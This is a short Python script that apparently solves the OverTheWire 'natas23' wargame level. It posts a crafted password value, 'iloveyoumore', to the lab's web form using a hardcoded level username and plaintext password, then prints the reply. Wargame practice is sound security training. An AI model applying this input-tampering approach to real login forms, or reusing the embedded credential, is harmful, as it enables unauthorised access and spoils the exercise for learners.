#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas23.natas.labs.overthewire.org"
username = "natas23"
password = "qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj"


r = requests.post(url, auth=(username, password), data=(dict(passwd="iloveyoumore")))
print (r.content)
